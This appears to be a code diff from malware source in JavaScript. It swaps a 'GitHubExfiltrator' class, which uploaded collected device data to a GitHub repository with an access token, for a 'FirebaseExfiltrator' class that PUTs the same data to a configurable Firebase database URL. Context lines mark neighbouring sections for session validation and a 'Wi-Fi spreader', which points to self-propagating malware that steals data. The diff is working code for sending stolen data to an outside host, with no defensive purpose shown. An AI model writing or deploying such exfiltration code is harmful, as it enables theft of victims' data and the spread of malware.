@@ -480,50 +480,24 @@ class SessionValidator {
 // ============================================
 // GITHUB EXFILTRATOR
 // ============================================
-class GitHubExfiltrator {
+class FirebaseExfiltrator {
   constructor(config) {
-    this.token = config.github.token;
-    this.owner = config.github.owner;
-    this.repo = config.github.repo;
-    this.dataFolder = config.github.dataFolder;
+    this.databaseURL = config.firebase.databaseURL;
   }
 
   async upload(data) {
-    const timestamp = new Date().toISOString().replace(/[:.]/g, "-");
-    const fileName = `${timestamp}_${data.device_id}.json`;
-    const filePath = `${this.dataFolder}/${fileName}`;
-    const content = Buffer.from(JSON.stringify(data, null, 2)).toString("base64");
+    const timestamp = Date.now();
+    const deviceId = data.device_id || "unknown";
+    const url = `${this.databaseURL}/devices/${deviceId}/${timestamp}.json`;
 
-    const apiUrl = `https://api.github.com/repos/${this.owner}/${this.repo}/contents/${filePath}`;
-    const payload = {
-      message: `Auto collection ${timestamp}`,
-      content: content,
-      branch: "main",
-    };
+    const response = await fetch(url, {
+      method: "PUT",
+      body: JSON.stringify(data),
+    });
 
-    try {
-      const response = await fetch(apiUrl, {
-        method: "PUT",
-        headers: {
-          "Authorization": `token ${this.token}`,
-          "Accept": "application/vnd.github.v3+json",
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify(payload),
-      });
-      return response.ok;
-    } catch (e) {
-      return false;
-    }
-  }
-
-  // Delete old file (for the replacement lifecycle)
-  async deleteFile(fileName) {
-    const apiUrl = `https://api.github.com/repos/${this.owner}/${this.repo}/contents/${this.dataFolder}/${fileName}`;
-    // In a real deletion, we need SHA; simplified here
+    return response.ok;
   }
 }
-
 // ============================================
 // WI-FI SPREADER
 // ============================================
